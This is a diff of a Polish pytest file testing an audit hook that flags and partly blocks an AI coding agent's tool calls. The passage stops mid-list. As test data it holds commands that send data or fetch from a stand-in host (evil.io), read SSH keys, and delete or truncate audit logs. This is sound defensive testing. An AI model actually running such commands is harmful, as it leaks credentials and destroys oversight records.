@@ -1,22 +1,29 @@
-"""Testy hooka audytowego wykonawców (`tools/audyt_hook.py`, zadanie 002, docs/rag/13) — bez sieci.
+"""Testy hooka audytowego wykonawców (`tools/audyt_hook.py`, zadania 002 i 029, docs/rag/13) — bez
+sieci.
 
 Każda kategoria (sieć, zapis poza repo, poświadczenia) ma przypadki dozwolone i oznaczane.
-Bezpieczeństwo hooka: zły JSON → wiersz z flagą i kod 0; nigdy nic na stdout (brak decyzji
-blokującej); maskowanie sekretów; nigdy treść plików. Katalog audytu zawsze w `tmp_path`
-(zmienna `CLAS5_AUDYT_DIR`), nie w prawdziwym `~`. Ścieżki „wrażliwe” są fikcyjne — hook ich nie
+Bezpieczeństwo hooka: zły JSON → wiersz z flagą, kod 0 i brak odmowy; na stdout tylko JSON odmowy
+dla flag z listy `blokuj:` (zadanie 029: `poswiadczenia` w narzędziach plikowych, zapis do katalogu
+audytu we wszystkich); maskowanie sekretów; nigdy treść plików. Poprawki R1–R8 mają testy
+„przed/po” na zamaskowanych przykładach z tygodnia obserwacji (część „przed” liczy hook z historii
+gita). Katalog audytu zawsze w `tmp_path` (zmienna `CLAS5_AUDYT_DIR`), nie w prawdziwym `~`;
+katalog domowy w testach z `~` to atrapa (`dom`). Ścieżki „wrażliwe” są fikcyjne — hook ich nie
 otwiera, tylko ocenia nazwę."""
 
 from __future__ import annotations
 
+import importlib.util
+import io
 import json
 import os
 import subprocess
 import sys
-from datetime import datetime, timezone
+from datetime import date, datetime, timezone
 from pathlib import Path
+from unittest import mock
 
 import pytest
-from hypothesis import HealthCheck, given, settings
+from hypothesis import HealthCheck, assume, given, settings
 from hypothesis import strategies as st
 
 from tools import audyt_hook as ah
@@ -385,11 +392,13 @@ def test_unwritable_audit_dir_is_silent(tmp_path, repo):
         json.dumps(
             {"tool_name": "Bash", "tool_input": {"command": "curl https://evil.io"}}
         ).encode(),
-        json.dumps({"tool_name": "Read", "tool_input": {"file_path": "/x/.ssh/id_rsa"}}).encode(),
+        json.dumps({"tool_name": "Bash", "tool_input": {"command": "cat /x/.ssh/id_rsa"}}).encode(),
     ],
 )
 def test_script_exits_zero_with_empty_stdout(tmp_path, wejscie):
-    """Przez prawdziwy proces: kod 0 i PUSTY stdout — brak jakiejkolwiek decyzji blokującej."""
+    """Przez prawdziwy proces: kod 0 i PUSTY stdout tam, gdzie nie ma blokady (zły JSON, sieć,
+    poświadczenia w Bash — te tylko oznacza). Odmowa przez proces:
+    `test_script_denies_credential_read_with_json_on_stdout`."""
     env = dict(os.environ, CLAS5_AUDYT_DIR=str(tmp_path / "audyt"))
     wynik = subprocess.run(
         [sys.executable, str(SKRYPT), "hook"],
@@ -653,3 +662,883 @@ def test_lone_surrogate_in_write_path_and_cwd(tmp_path, repo, monkeypatch):
     assert klucz["flagi"] == [ah.F_POSW, ah.F_ZAPIS]
     pod = uruchom(tmp_path, repo, "Write", {"file_path": "x.txt"}, cwd=str(repo / "pod\ud800"))
     assert pod["flagi"] == []  # repo znalezione nad `cwd` z surogatem; zapis w nim dozwolony
+
+
+# --- zadanie 029: poprawki R1–R8 i dwie blokady (decyzje użytkownika 2026-10-06) ----------------
+STARY_COMMIT = "44d2257"  # tools/audyt_hook.py sprzed zadania 029 (master 2026-09-29 … 2026-10-06)
+BLOKADY = ah.wczytaj_blokady(ROOT / "config" / "audyt_hosty.yaml")
+PLIKOWE = ["Read", "Write", "Edit", "MultiEdit", "NotebookEdit", "Grep", "Glob"]
+SCRATCHPAD = f"{TMP_TESTOWY}/claude-1000/-home-x-alpha/s1/scratchpad"  # sesja „s1” jak w `uruchom`
+NAGLOWEK = 'hosty:\n  - github.com  # komentarz\n  - "::1"\n'
+P, Z = ah.F_POSW, ah.F_AUDYT_ZAPIS
+
+
+@pytest.fixture(scope="module")
+def stary(tmp_path_factory):
+    """Hook sprzed zadania 029 z historii gita — część „przed” testów przed/po. Bez historii
+    (płytki klon, brak gita) → None: część „przed” jest pomijana, część „po” działa zawsze."""
+    try:
+        wynik = subprocess.run(
+            ["git", "-C", str(ROOT), "show", f"{STARY_COMMIT}:tools/audyt_hook.py"],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    if wynik.returncode != 0:
+        return None
+    plik = tmp_path_factory.mktemp("przed_029") / "audyt_hook_przed_029.py"
+    plik.write_text(wynik.stdout, encoding="utf-8")
+    spec = importlib.util.spec_from_file_location("audyt_hook_przed_029", plik)
+    modul = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(modul)
+    return modul
+
+
+@pytest.fixture()
+def dom(tmp_path, monkeypatch):
+    """Fikcyjny katalog domowy w `tmp_path`: `~/.ssh` i `~/.claude` to atrapy, nigdy prawdziwe."""
+    katalog = tmp_path / "dom"
+    katalog.mkdir()
+    monkeypatch.setenv("HOME", str(katalog))
+    monkeypatch.setenv("USERPROFILE", str(katalog))
+    return katalog
+
+
+@pytest.fixture()
+def repo_git(tmp_path):
+    """Repozytorium gita z `origin` na github.com (z listy hostów); tylko `remote get-url`."""
+    katalog = tmp_path / "g"
+    katalog.mkdir()
+    _git(katalog, "init", "-q")
+    _git(katalog, "remote", "add", "origin", "git@github.com:piotrgebala/alpha.git")
+    return katalog
+
+
+def flagi_analizy(modul, cwd, katalog, narzedzie, wejscie, **pola) -> list[str]:
+    dane = {"session_id": "s1", "cwd": str(cwd), "tool_name": narzedzie, "tool_input": wejscie}
+    wynik, _ = modul.analizuj({**dane, **pola}, HOSTY, os.path.realpath(str(katalog)))
+    return sorted(wynik.flagi)
+
+
+def przed_po(stary, monkeypatch, cwd, katalog, narzedzie, wejscie, przed, po, **pola):
+    """Zamaskowany przykład z tygodnia: stare reguły dają `przed`, nowe — `po`."""
+    if stary is not None:
+        monkeypatch.setattr(stary, "katalogi_tmp", lambda: [TMP_TESTOWY])
+        assert flagi_analizy(stary, cwd, katalog, narzedzie, wejscie, **pola) == sorted(przed)
+    assert flagi_analizy(ah, cwd, katalog, narzedzie, wejscie, **pola) == sorted(po)
+
+
+def wywolaj(tmp_path, repo, narzedzie, wejscie, blokady=BLOKADY, **pola):
+    """Jedno wywołanie przez `przetworz` → (ostatni wiersz dziennika, decyzja odmowy albo None)."""
+    dane = {"session_id": "s1", "cwd": str(repo), "tool_name": narzedzie, "tool_input": wejscie}
+    plik, odmowa = ah.przetworz(
+        json.dumps({**dane, **pola}), tmp_path / "audyt", HOSTY, TERAZ, blokady
+    )
+    return json.loads(plik.read_text(encoding="ascii").splitlines()[-1]), odmowa
+
+
+def wejscie_dla(narzedzie: str, sciezka: str) -> dict:
+    if narzedzie == "NotebookEdit":
+        return {"notebook_path": sciezka}
+    if narzedzie == "Grep":
+        return {"pattern": "BEGIN", "path": sciezka}
+    if narzedzie == "Glob":
+        return {"pattern": sciezka}
+    return {"file_path": sciezka}
+
+
+def uruchom_main(surowe: bytes, katalog: Path) -> tuple[int, bytes]:
+    """`main(["hook"])` w procesie testu: stdin/stdout podmienione (z `.buffer`), katalog audytu
+    w `katalog`."""
+    wejscie = io.TextIOWrapper(io.BytesIO(surowe))
+    wyjscie = io.TextIOWrapper(io.BytesIO(), encoding="ascii")
+    with (
+        mock.patch.object(sys, "stdin", wejscie),
+        mock.patch.object(sys, "stdout", wyjscie),
+        mock.patch.dict(os.environ, {"CLAS5_AUDYT_DIR": str(katalog)}),
+    ):
+        kod = ah.main(["hook"])
+    return kod, wyjscie.buffer.getvalue()
+
+
+def _bez_dat(wartosc):
+    """PyYAML robi z `2026-10-06` datę, hook trzyma tekst — do porównania data → tekst."""
+    if isinstance(wartosc, dict):
+        return {k: _bez_dat(v) for k, v in wartosc.items()}
+    if isinstance(wartosc, list):
+        return [_bez_dat(v) for v in wartosc]
+    if isinstance(wartosc, (date, datetime)):
+        return wartosc.isoformat()
+    return wartosc
+
+
+def blokady_wg_pyyaml(tekst: str) -> tuple:
+    """Wzorzec: ten sam tekst przez PyYAML i te same reguły wpisu (`ah._blokada`). PyYAML pada →
+    brak blokad (zepsuty YAML nie blokuje)."""
+    import yaml
+
+    try:
+        dokument = yaml.safe_load(tekst)
+    except Exception:  # YAMLError, a przy niemożliwej dacie także ValueError
+        return ()
+    if not isinstance(dokument, dict) or not isinstance(dokument.get("blokuj"), list):
+        return ()
+    return tuple(b for b in map(ah._blokada, _bez_dat(dokument["blokuj"])) if b is not None)
+
+
+def test_old_hook_for_before_after_is_loaded_when_commit_exists(stary):
+    """Bez tego część „przed” testów przed/po mogłaby się po cichu nie wykonać."""
+    jest = subprocess.run(
+        ["git", "-C", str(ROOT), "cat-file", "-e", f"{STARY_COMMIT}^{{commit}}"],
+        capture_output=True,
+    )
+    if jest.returncode != 0:
+        pytest.skip("brak commita sprzed zadania 029 (płytki klon)")
+    assert stary is not None and hasattr(stary, "analizuj") and not hasattr(stary, "przetworz")
+
+
+# R1 — numer deskryptora (`2>&1`) to nie nazwa zdalnego repo -----------------------------------
+@pytest.mark.parametrize(
+    ("polecenie", "przed"),
+    [
+        ("git pull -q 2>&1 | tail -2", [ah.F_SIEC_NIEZNANY]),  # H1 z tygodnia
+        ("git push -q 2>&1 | tail -1", [ah.F_SIEC_NIEZNANY]),
+        ("git fetch 2>/dev/null; git status -sb", [ah.F_SIEC_NIEZNANY]),
+        ("git push > log.txt", [ah.F_SIEC_NIEZNANY]),  # cel przekierowania to nie zdalne repo
+        ("git push origin master 2>&1", []),
+    ],
+)
+def test_r1_fd_number_and_redirect_are_not_a_remote(
+    tmp_path, repo_git, stary, monkeypatch, polecenie, przed
+):
+    wejscie = {"command": polecenie}
+    przed_po(stary, monkeypatch, repo_git, tmp_path / "audyt", "Bash", wejscie, przed, [])
+
+
+def test_r1_push_to_unlisted_host_is_still_flagged(tmp_path):
+    zly = tmp_path / "zly"
+    zly.mkdir()
+    _git(zly, "init", "-q")
+    _git(zly, "remote", "add", "origin", "https://evil.io/x.git")
+    for polecenie in ("git push 2>&1 | tail -1", "git push -q origin HEAD 2>/dev/null"):
+        rekord = bash(tmp_path, zly, polecenie)
+        assert rekord["flagi"] == [ah.F_SIEC] and rekord["hosty_spoza_listy"] == ["evil.io"]
+    rekord = bash(tmp_path, zly, "git push https://gitlab.com/x/y.git HEAD 2>&1")
+    assert rekord["flagi"] == [ah.F_SIEC] and rekord["hosty_spoza_listy"] == ["gitlab.com"]
+
+
+def test_r1_tokenizer_drops_only_glued_fd_numbers():
+    assert ah.segmenty("git pull -q 2>&1 | tail -2") == [["git", "pull", "-q"], ["tail", "-2"]]
+    assert ah.segmenty("python x.py 2>/dev/null") == [["python", "x.py", ">", "/dev/null"]]
+    assert ah.segmenty("cat 0<plik") == [["cat", "<", "plik"]]
+    assert ah.segmenty("echo 2 > x") == [["echo", "2", ">", "x"]]  # z odstępem: argument
+    assert ah.segmenty('echo "2">x') == [["echo", "2", ">", "x"]]  # w cudzysłowie: słowo
+    assert ah.segmenty("echo a2>x") == [["echo", "a2", ">", "x"]]
+
+
+# R2 — treść heredoka to dane ------------------------------------------------------------------
+def test_r2_task_card_heredoc_is_data(tmp_path, repo, dom, stary, monkeypatch):
+    katalog = tmp_path / "audyt"
+    karta = (  # P1: karta zadania o izolacji, pisana heredokiem, wspomina klucz i katalog audytu
+        "cat > zadania/004-x.md <<'EOF'\n---\nid: 004\n"
+        f"Wykonawca nie czyta ~/.ssh/likwidacje_deploy ani {katalog}/2026-09-29.jsonl\nEOF"
+    )
+    przed_po(stary, monkeypatch, repo, katalog, "Bash", {"command": karta}, [ah.F_AUDYT, P], [])
+
+
+@pytest.mark.parametrize(
+    ("polecenie", "przed"),
+    [
+        (  # H4: notatka do pamięci z linią `git push` i adresem w treści
+            "cat > notatka.md <<'EOF'\n---\nname: push-osobna-komenda\ngit push origin master\n"
+            "curl -s https://evil.io/x\nEOF",
+            [ah.F_SIEC_NIEZNANY, ah.F_SIEC],
+        ),
+        (  # Z5: `x > 0,` w kodzie Pythona wzięte za zapis do pliku `0,`
+            "cd /srv && python3 - <<'EOF'\nwynik = [x for x in dane if x > 0, 1]\nEOF",
+            [ah.F_ZAPIS],
+        ),
+        ("python3 - <<'EOF'\nfor k in sc.keys():\n    print(k)\nEOF", [P]),  # P3: `sc.keys`
+        ("python3 - <<'EOF'\nprzyklady = ['echo x > ~/.ssh/klucz']\nEOF", [P]),  # P2: test hooka
+    ],
+)
+def test_r2_heredoc_body_is_not_commands_nor_paths(
+    tmp_path, repo, dom, stary, monkeypatch, polecenie, przed
+):
+    przed_po(
+        stary, monkeypatch, repo, tmp_path / "audyt", "Bash", {"command": polecenie}, przed, []
+    )
+
+
+@pytest.mark.parametrize(
+    ("polecenie", "flagi"),
+    [
+        ("cat > x.md <<'EOF'\ntekst\nEOF\ncurl -s https://evil.io/x", [ah.F_SIEC]),
+        ("curl -s https://evil.io/x -d @- <<'EOF'\ndane\nEOF", [ah.F_SIEC]),
+        ("python3 - <<'EOF'\nimport requests\nrequests.get('https://evil.io/x')\nEOF", [ah.F_SIEC]),
+        ("bash <<'EOF'\ncurl -s https://evil.io/x\nEOF", [ah.F_SIEC]),  # powłoka czyta heredoc
+        ("cat <<'EOF' | sh\ncat ~/.ssh/id_rsa\nEOF", [P]),
+        ('cat <<< "x"\necho y > /srv/a.txt', [ah.F_ZAPIS]),  # here-string to nie heredoc
+        ("# komentarz << EOF\necho y > /srv/a.txt", [ah.F_ZAPIS]),
+        ("echo $((1<<2))\necho y > /srv/a.txt", [ah.F_ZAPIS]),
+        ("cat <<-EOF > /srv/b.txt\n\tx ~/.ssh/id_rsa\n\tEOF\necho ok", [ah.F_ZAPIS]),
+    ],
+)
+def test_r2_real_events_around_heredocs_are_still_flagged(tmp_path, repo, dom, polecenie, flagi):
+    assert bash(tmp_path, repo, polecenie)["flagi"] == flagi
+
+
+def test_bez_heredokow_cuts_bodies_and_keeps_operator():
+    assert ah.bez_heredokow("cat > a.md <<'EOF'\nlinia 1\nlinia 2\nEOF\necho ok") == (
+        "cat > a.md <<'EOF'\necho ok",
+        ["linia 1\nlinia 2"],
+    )
+    assert ah.bez_heredokow("cat <<A <<-B\na\nA\n\tb\n\tB\nkoniec") == (
+        "cat <<A <<-B\nkoniec",
+        ["a", "\tb"],
+    )
+    assert ah.bez_heredokow("echo '<<EOF'\nx") == ("echo '<<EOF'\nx", [])
+    assert ah.bez_heredokow("git commit -m \"$(cat <<'EOF'\nx\nEOF\n)\"")[1] == []
+    assert ah.bez_heredokow("cat <<< x\ny") == ("cat <<< x\ny", [])
+    assert ah.bez_heredokow("python3 - <<EOF\nbez końca") == ("python3 - <<EOF\n", ["bez końca"])
+    assert ah.bez_heredokow("cat <<'E\nx") == ("cat <<'E\nx", [])  # niedomknięty: nie heredoc
+
+
+# R3 — słowo z nową linią to nie ścieżka --------------------------------------------------------
+@pytest.mark.parametrize(
+    "polecenie",
+    [  # P2: wieloliniowy kod `python -c`; opis commita z `"$(cat <<'EOF' … EOF)"`
+        "python3 -c \"import os\nprint(os.path.exists('~/.ssh/id_ed25519'))\"",
+        "git commit -q -m \"$(cat <<'EOF'\nOpis: ~/.ssh/klucz bez zmian\nEOF\n)\"",
+    ],
+)
+def test_r3_multiline_word_is_not_a_path(tmp_path, repo, dom, stary, monkeypatch, polecenie):
+    przed_po(stary, monkeypatch, repo, tmp_path / "audyt", "Bash", {"command": polecenie}, [P], [])
+
+
+@pytest.mark.parametrize(
+    "polecenie",
+    [
+        "cat ~/.ssh/id_ed25519",
+        "python3 -c \"print(open('~/.ssh/config').read())\"",  # jedna linia: dalej widać
+        # reszta z tygodnia (P2, 1 wiersz): JSON z `~/.ssh/…` w jednym słowie — dalej oznaczony
+        'for j in \'{"tool_name":"Read","tool_input":{"file_path":"~/.ssh/id_ed25519"}}\'; '
+        'do echo "$j"; done',
+    ],
+)
+def test_r3_single_line_credential_paths_in_bash_are_flagged_not_denied(
+    tmp_path, repo, dom, polecenie
+):
+    rekord, odmowa = wywolaj(tmp_path, repo, "Bash", {"command": polecenie})
+    assert rekord["flagi"] == [P] and odmowa is None and "zablokowano" not in rekord
+
+
+# R4 — `$NAZWA` z prostego przypisania w tym samym poleceniu ------------------------------------
+def test_r4_assigned_scratchpad_variable_is_expanded(tmp_path, repo, stary, monkeypatch):
+    polecenie = f"cd /srv && S={SCRATCHPAD}; cat > $S/merge017.txt <<'EOF'\nMerge: zad. 017\nEOF"
+    wejscie = {"command": polecenie}  # Z4 z tygodnia: cel w scratchpadzie przez `$S`
+    przed_po(stary, monkeypatch, repo, tmp_path / "audyt", "Bash", wejscie, [ah.F_ZAPIS], [])
+
+
+def test_r4_cd_into_assigned_directory_resolves_remote(
+    tmp_path, repo, repo_git, stary, monkeypatch
+):
+    wejscie = {"command": f"W={repo_git}; cd $W; git fetch -q origin"}  # H5 z tygodnia
+    przed_po(
+        stary, monkeypatch, repo, tmp_path / "audyt", "Bash", wejscie, [ah.F_SIEC_NIEZNANY], []
+    )
+
+
+def test_r4_unexpanded_variable_gives_no_write_outside_repo(tmp_path, repo, stary, monkeypatch):
+    wejscie = {"command": "cd /srv && cat > $NIEZNANA/x.txt <<'EOF'\nx\nEOF"}
+    przed_po(stary, monkeypatch, repo, tmp_path / "audyt", "Bash", wejscie, [ah.F_ZAPIS], [])
+
+
+@pytest.mark.parametrize(
+    ("polecenie", "flagi"),
+    [
+        ("S=/srv/wspolny; echo x > $S/kanal.txt", [ah.F_ZAPIS]),  # przed R4 niewidoczne
+        ("export S=/srv/wspolny && echo x > ${S}/kanal.txt", [ah.F_ZAPIS]),
+        ("export K=~/.ssh; cat $K/config", [P]),
+        (f"S={TMP_TESTOWY}/wspolny; echo x > $S/kanal.txt", [ah.F_TMP]),
+        ("S=$(mktemp -d); echo x > $S/kanal.txt", []),  # wartość nieznana: `$S` nierozwinięte
+    ],
+)
+def test_r4_expansion_also_reveals_real_writes(tmp_path, repo, dom, polecenie, flagi):
+    assert bash(tmp_path, repo, polecenie)["flagi"] == flagi
+
+
+def test_rozwin_zmienne_expands_known_names_only(dom):
+    wynik = ah.rozwin_zmienne("$S/a ${S}/b $SS/c $HOME/d $INNA", {"S": "/tmp/x"})
+    assert wynik == f"/tmp/x/a /tmp/x/b $SS/c {dom}/d $INNA"
+
+
+# R5 — własny scratchpad sesji bez flagi ---------------------------------------------------------
+def test_r5_own_scratchpad_is_not_flagged(tmp_path, repo, stary, monkeypatch):
+    katalog = tmp_path / "audyt"
+    plik = {"file_path": f"{SCRATCHPAD}/czas.py"}
+    przed_po(stary, monkeypatch, repo, katalog, "Write", plik, [ah.F_TMP], [])
+    przed_po(stary, monkeypatch, repo, katalog, "Write", plik, [ah.F_TMP], [], agent_id="a1")
+    heredok = {"command": f"cat > {SCRATCHPAD}/czas.py <<'EOF'\nprint(1)\nEOF"}  # T1 z tygodnia
+    przed_po(stary, monkeypatch, repo, katalog, "Bash", heredok, [ah.F_TMP], [])
+
+
+@pytest.mark.parametrize(
+    "sciezka",
+    [
+        f"{TMP_TESTOWY}/claude-1000/-home-x-alpha/s2/scratchpad/x.py",  # scratchpad innej sesji
+        f"{TMP_TESTOWY}/claude-1000/-home-x-alpha/s1/inne/x.py",  # obok scratchpadu
+        f"{TMP_TESTOWY}/wspolny.txt",
+        f"{TMP_TESTOWY}/s1/scratchpad/x.py",  # bez `claude-<uid>/<projekt>/`
+    ],
+)
+def test_r5_rest_of_tmp_is_still_flagged(tmp_path, repo, sciezka):
+    assert uruchom(tmp_path, repo, "Write", {"file_path": sciezka})["flagi"] == [ah.F_TMP]
+
+
+@pytest.mark.parametrize("sesja", [None, "", "..", "s1/../s2", "a" * 200])
+def test_r5_odd_session_id_gives_no_exemption(sesja):
+    sciezka = f"{TMP_TESTOWY}/claude-1000/p/{sesja}/scratchpad/x"
+    assert not ah.wlasny_scratchpad(sciezka, sesja)
+
+
+# R6 — katalogi Claude Code ----------------------------------------------------------------------
+def test_r6_main_session_memory_and_plans_are_not_flagged(tmp_path, repo, dom, stary, monkeypatch):
+    katalog = tmp_path / "audyt"
+    pamiec = {"file_path": "~/.claude/projects/-home-x-alpha/memory/nota-przekazania.md"}  # Z1
+    przed_po(stary, monkeypatch, repo, katalog, "Write", pamiec, [ah.F_ZAPIS], [])
+    dopisz = {"command": "cat >> ~/.claude/projects/-home-x-alpha/memory/MEMORY.md <<'EOF'\nx\nEOF"}
+    przed_po(stary, monkeypatch, repo, katalog, "Bash", dopisz, [ah.F_ZAPIS], [])
+    plan = {"file_path": "~/.claude/plans/plan.md"}  # Z2: także subagent
+    przed_po(stary, monkeypatch, repo, katalog, "Write", plan, [ah.F_ZAPIS], [])
+    przed_po(stary, monkeypatch, repo, katalog, "Write", plan, [ah.F_ZAPIS], [], agent_id="a1")
+
+
+def test_r6_subagent_writing_memory_is_still_flagged(tmp_path, repo, dom):
+    pamiec = "~/.claude/projects/-home-x-alpha/memory/nota.md"
+    zapis = uruchom(tmp_path, repo, "Write", {"file_path": pamiec}, agent_id="a1")
+    polecenie = {"command": f"cat >> {pamiec} <<'EOF'\nx\nEOF"}
+    dopisanie = uruchom(tmp_path, repo, "Bash", polecenie, agent_id="a1")
+    assert zapis["flagi"] == [ah.F_ZAPIS] and dopisanie["flagi"] == [ah.F_ZAPIS]
+
+
+@pytest.mark.parametrize(
+    "sciezka",
+    [
+        "~/.claude/settings.json",
+        "~/.claude/projects/-home-x-alpha/inne.md",
+        "~/.claude/projects/memory/x.md",
+    ],
+)
+def test_r6_other_claude_paths_are_still_flagged(tmp_path, repo, dom, sciezka):
+    assert uruchom(tmp_path, repo, "Write", {"file_path": sciezka})["flagi"] == [ah.F_ZAPIS]
+
+
+# R7 — format `blokuj:` --------------------------------------------------------------------------
+def test_shipped_config_blocks_exactly_the_two_user_decisions():
+    assert BLOKADY == (
+        ah.Blokada(P, frozenset(PLIKOWE), "2026-10-06"),
+        ah.Blokada(Z, None, "2026-10-06"),
+    )
+    assert ah.wczytaj_blokady() == BLOKADY  # domyślnie plik z repo
+
+
+def test_shipped_config_is_inside_subset_and_matches_pyyaml():
+    tekst = (ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8")
+    assert ah.yaml_podzbior(tekst) is not None and "\t" not in tekst
+    assert BLOKADY == blokady_wg_pyyaml(tekst)
+
+
+def test_environment_variables_do_not_switch_blocks(tmp_path, monkeypatch):
+    """Decyzja „Wszędzie”: żadna zmienna środowiskowa nie wyłącza blokad (także ta od hostów)."""
+    pusty = tmp_path / "pusty.yaml"
+    pusty.write_text("hosty: []\nblokuj: []\n", encoding="utf-8")
+    monkeypatch.setenv("CLAS5_AUDYT_HOSTY", str(pusty))
+    monkeypatch.setenv("CLAS5_AUDYT_DIR", str(tmp_path / "audyt"))
+    assert ah.wczytaj_hosty() == frozenset() and ah.wczytaj_blokady() == BLOKADY
+
+
+@pytest.mark.parametrize(
+    ("tekst", "oczekiwane"),
+    [
+        ("blokuj:\n  - poswiadczenia\n", [ah.Blokada(P)]),
+        ("blokuj:\n- poswiadczenia\n- dziennik_audytu_zapis\n", [ah.Blokada(P), ah.Blokada(Z)]),
+        ("blokuj: [poswiadczenia, dziennik_audytu_zapis]\n", [ah.Blokada(P), ah.Blokada(Z)]),
+        (
+            "blokuj:\n  - {flaga: poswiadczenia, narzedzia: [Read, Grep]}\n",
+            [ah.Blokada(P, frozenset({"Read", "Grep"}))],
+        ),
+        (
+            "blokuj:\n  - flaga: poswiadczenia\n    narzedzia:\n      - Read\n      - Write\n",
+            [ah.Blokada(P, frozenset({"Read", "Write"}))],
+        ),
+        (
+            "blokuj:\n  - flaga: poswiadczenia\n    narzedzia:\n    - Read\n",
+            [ah.Blokada(P, frozenset({"Read"}))],
+        ),
+        (
+            "blokuj:\n  -   flaga: 'poswiadczenia'  # komentarz\n      decyzja: \"2026-10-06\"\n",
+            [ah.Blokada(P, None, "2026-10-06")],
+        ),
+        (
+            "blokuj:\n  - flaga: poswiadczenia\n    decyzja: 2026-10-06\n",
+            [ah.Blokada(P, None, "2026-10-06")],
+        ),
+        ("blokuj:\n  -\n    flaga: dziennik_audytu_zapis\n", [ah.Blokada(Z)]),
+        # zły wpis niczego nie blokuje, reszta działa
+        ("blokuj:\n  - nieznana_flaga\n  - poswiadczenia\n", [ah.Blokada(P)]),
+        ("blokuj:\n  - blad_analizy\n  - wejscie_nieczytelne\n", []),  # błąd hooka: nigdy
+        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: [read]}\n", []),
+        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: [Read, WebSearch]}\n", []),
+        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: []}\n", []),
+        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: Read}\n", []),
+        ("blokuj:\n  - {flaga: poswiadczenia, narzedzie: [Read]}\n", []),  # literówka w kluczu
+        ("blokuj:\n  - {narzedzia: [Read]}\n", []),
+        ("blokuj:\n  - {flaga: poswiadczenia, decyzja: wczoraj}\n", []),
+        ("blokuj:\n  - {flaga: poswiadczenia, decyzja: '2026-13-45'}\n", []),
+        ("blokuj:\n  - [poswiadczenia]\n  - dziennik_audytu_zapis\n", [ah.Blokada(Z)]),
+        ("blokuj:\n  - ~\n  - yes\n  - 1\n  - ''\n", []),
+        # brak listy, pusta lista (ścieżka odwrotu)
+        ("blokuj: []\n", []),
+        ("blokuj:\n", []),
+        ("blokuj: poswiadczenia\n", []),
+        ("blokuj: {flaga: poswiadczenia}\n", []),
+        ("", []),
+    ],
+)
+def test_block_entries_match_pyyaml(tekst, oczekiwane):
+    pelny = NAGLOWEK + tekst
+    assert list(ah.parsuj_blokady(pelny)) == oczekiwane
+    assert list(blokady_wg_pyyaml(pelny)) == oczekiwane
+
+
+@pytest.mark.parametrize(
+    "tekst",
+    [
+        "blokuj:\n  - poswiadczenia\n  - [dziennik_audytu_zapis\n",  # niedomknięty nawias
+        "blokuj:\n\t- poswiadczenia\n",  # tabulator
+        "blokuj:\n  - poswiadczenia\n - dziennik_audytu_zapis\n",  # złe wcięcie
+        "blokuj:\n  - poswiadczenia\n  dziennik_audytu_zapis\n",
+        "blokuj:\n  - poswiadczenia\nblokuj:\n  - dziennik_audytu_zapis\n",  # powtórzony klucz
+        "blokuj:\n  - flaga: poswiadczenia\n    decyzja: 2026-13-45\n",  # YAML pada na dacie
+        "blokuj:\n  - 'poswiadczenia\n",  # niedomknięty apostrof
+        "blokuj:\n  - &a poswiadczenia\n  - *a\n",  # kotwice: poza podzbiorem
+        "blokuj:\n  - |\n    poswiadczenia\n",  # skalar blokowy: poza podzbiorem
+        "---\nblokuj:\n  - poswiadczenia\n",  # znacznik dokumentu: poza podzbiorem
+        "\ufeffblokuj:\n  - poswiadczenia\n",  # BOM w środku tekstu
+        "blokuj:\n  - poswiadczenia\x0b\n",  # znak sterujący
+        "blokuj:\n  - 0x_\n  - poswiadczenia\n",  # YAML pada: liczba bez cyfr
+    ],
+)
+def test_broken_or_unsupported_yaml_blocks_nothing(tekst):
+    assert ah.parsuj_blokady(NAGLOWEK + tekst) == ()
+
+
+def test_missing_or_unreadable_config_blocks_nothing(tmp_path):
+    assert ah.wczytaj_blokady(tmp_path / "brak.yaml") == ()
+    zly = tmp_path / "zly.yaml"
+    zly.write_bytes(b"blokuj:\n  - poswiadczenia\n\xff\xfe\n")
+    assert ah.wczytaj_blokady(zly) == ()
+
+
+def test_windows_file_with_bom_and_crlf_reads_like_unix(tmp_path):
+    tekst = (ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8")
+    plik = tmp_path / "audyt_hosty.yaml"
+    plik.write_bytes(b"\xef\xbb\xbf" + tekst.replace("\n", "\r\n").encode("utf-8"))
+    assert ah.wczytaj_blokady(plik) == BLOKADY
+
+
+def test_rollback_empty_list_returns_hook_to_flagging_only(tmp_path, repo, dom):
+    tekst = (ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8")
+    blokady = ah.parsuj_blokady(tekst.partition("\nblokuj:")[0] + "\nblokuj: []\n")
+    rekord, odmowa = wywolaj(tmp_path, repo, "Read", {"file_path": "~/.ssh/id_ed25519"}, blokady)
+    assert blokady == () and rekord["flagi"] == [P] and odmowa is None
+    assert "zablokowano" not in rekord
+
+
+def test_blocked_flags_respect_tool_scope_and_never_hook_errors():
+    blokady = (ah.Blokada(P, frozenset({"Read"})), ah.Blokada(Z), ah.Blokada(ah.F_BLAD))
+    assert ah.zablokowane_flagi({P, Z}, "Read", blokady) == [Z, P]
+    assert ah.zablokowane_flagi({P}, "Bash", blokady) == []
+    assert ah.zablokowane_flagi({ah.F_BLAD, ah.F_WEJSCIE}, "Bash", blokady) == []
+
+
+# R8 i blokada zapisu do katalogu audytu ----------------------------------------------------------
+@pytest.mark.parametrize("narzedzie", ["Write", "Edit", "MultiEdit", "NotebookEdit"])
+def test_r8_write_tools_into_audit_dir_are_denied(tmp_path, repo, narzedzie):
+    sciezka = str(tmp_path / "audyt" / "2026-10-06.jsonl")
+    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie_dla(narzedzie, sciezka))
+    assert Z in rekord["flagi"] and ah.F_AUDYT not in rekord["flagi"]
+    assert rekord["zablokowano"] == [Z]
+    assert odmowa["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+@pytest.mark.parametrize(
+    "szablon",
+    [
+        "echo x >> {k}/a.jsonl",  # przykład z karty zadania
+        "echo x | tee -a {k}/a.jsonl",
+        "cp /dev/null {k}/a.jsonl",
+        "sed -i d {k}/a.jsonl",
+        "rm -f {k}/a.jsonl",
+        "mv {k}/a.jsonl /srv/kopia.jsonl",
+        "truncate -s 0 {k}/a.jsonl",
+        "ln -sf /dev/null {k}/a.jsonl",
+        "find {k} -name '*.jsonl' -delete",
